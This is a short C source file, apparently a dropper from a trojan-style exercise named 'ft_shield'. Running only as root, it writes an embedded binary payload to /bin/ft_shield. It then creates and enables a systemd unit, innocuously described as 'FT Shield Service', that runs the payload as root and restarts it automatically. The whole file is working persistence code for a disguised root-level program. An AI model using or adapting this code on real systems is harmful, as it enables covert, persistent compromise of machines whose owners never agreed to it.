#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>
#include <string.h>

extern const char _binary_payload_start[];
extern const char _binary_payload_end[];

#define TARGET_PATH "/bin/ft_shield"
#define SERVICE_PATH "/etc/systemd/system/ft_shield.service"

const char *service_file_content =
    "[Unit]\n"
    "Description=FT Shield Service\n"
    "After=network.target\n\n"
    "[Service]\n"
    "Type=simple\n"
    "ExecStart=" TARGET_PATH "\n"
    "Restart=always\n"
    "RestartSec=5\n"
    "User=root\n\n"
    "[Install]\n"
    "WantedBy=multi-user.target\n";

void setup_systemd_service() {
    int fd = open(SERVICE_PATH, O_CREAT|O_WRONLY|O_TRUNC, 0644);
    if (fd < 0) exit(EXIT_FAILURE);

    size_t service_len = strlen(service_file_content);
    if (write(fd, service_file_content, service_len) != (ssize_t)service_len) {
        perror("write service");
        close(fd);
        exit(EXIT_FAILURE);
    }
    close(fd);

    system("systemctl daemon-reload");
    system("systemctl enable --now ft_shield.service");
}

void write_payload() {
    size_t size = (size_t)(_binary_payload_end - _binary_payload_start);
    
    int fd = open(TARGET_PATH, O_CREAT|O_WRONLY|O_TRUNC, 0755);
    if (fd < 0) exit(EXIT_FAILURE);

    if (write(fd, _binary_payload_start, size) != (ssize_t)size) {
        close(fd);
        exit(EXIT_FAILURE);
    }
    close(fd);

    if (chmod(TARGET_PATH, 0755) == -1) exit(EXIT_FAILURE);
}

int main() {
    if (geteuid() != 0) {return EXIT_FAILURE;}

    printf("%s\n", getlogin());
    write_payload();
    setup_systemd_service();
    
    return EXIT_SUCCESS;
}